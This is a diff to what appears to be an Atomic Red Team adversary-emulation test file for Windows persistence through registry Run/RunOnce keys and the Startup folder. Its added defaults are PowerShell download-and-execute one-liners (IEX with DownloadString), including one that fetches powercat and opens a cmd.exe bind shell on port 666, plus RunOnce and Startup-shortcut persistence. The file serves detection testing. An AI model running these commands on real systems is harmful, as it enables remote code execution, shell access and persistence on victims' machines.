@@ -14,7 +14,7 @@ atomic_tests:
     command_to_execute:
       description: Thing to Run
       type: Path
-      default: C:\Path\AtomicRedTeam.exe
+      default: powershell 'IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1060/powercat.ps1'); powercat -l -p 666 -e cmd.exe'
 
   executor:
     name: command_prompt
@@ -31,7 +31,7 @@ atomic_tests:
     thing_to_execute:
       description: Thing to Run
       type: Path
-      default: C:\Path\AtomicRedTeam.dll
+      default: powershell 'IEX (New-Object Net.WebClient).DownloadString(`'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1060/Discovery.bat`')'
 
   executor:
     name: command_prompt
@@ -54,7 +54,7 @@ atomic_tests:
     name: powershell
     command: |
         $RunOnceKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
-        set-itemproperty $RunOnceKey "NextRun" '#{thing_to_execute} "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Payloads/Discovery.bat`")"'
+        set-itemproperty $RunOnceKey "NextRun" '#{thing_to_execute} "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1060/Discovery.bat`")"'
 - name: Startup Folder
   description: |
     Add Shortcut To Startup via PowerShell
@@ -71,7 +71,7 @@ atomic_tests:
   executor:
     name: powershell
     command: |
-        $TargetFile = "$env:SystemRoot\System32\#{thing_to_execute}"
+        $TargetFile = "#{thing_to_execute}"
         $ShortcutFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Notepad.lnk"
         $WScriptShell = New-Object -ComObject WScript.Shell
         $Shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
